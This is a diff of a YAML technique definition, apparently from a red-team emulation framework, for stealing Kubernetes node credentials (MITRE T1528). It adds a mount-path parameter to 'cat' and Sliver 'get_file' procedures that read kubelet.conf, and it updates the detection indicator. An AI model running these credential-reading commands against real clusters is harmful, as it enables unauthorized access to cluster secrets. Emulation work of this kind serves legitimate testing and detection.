@@ -3,15 +3,19 @@ description: Reads the kubelet.conf from the filesystem of a node
 tactic: Credential Access
 techniques: ["Steal Application Access Token", "T1528"]
 parameters:
+  MOUNT_PATH:
+    type: string
+    description: the mount path of the host node
+    default: "${SRC.MOUNT_PATH}"
   PATH:
     type: string
     description: the path to the service account
     default: "/etc/kubernetes/kubelet.conf"
 procedures:
   - key: cat
-    command: cat ${PATH}
+    command: cat ${MOUNT_PATH}${PATH}
   - key: sliver
-    command: get_file ${PATH}
+    command: get_file ${MOUNT_PATH}${PATH}
 preconditions:
   accessLevel: user-read
   kind: Node
@@ -23,7 +27,7 @@ effects:
 #     description: A running Kubernetes pod with a mounted service account token.
 indicators:
   - type: File
-    description: The service account token file
-    location: /var/run/secrets/kubernetes.io/serviceaccount/token
+    description: The kubelet.conf file on the host node
+    location: "${MOUNT_PATH}/${PATH}"
 references:
   - https://kubernetes.io/docs/tasks/access-application-cluster/access-cluster/#accessing-the-api-from-a-pod
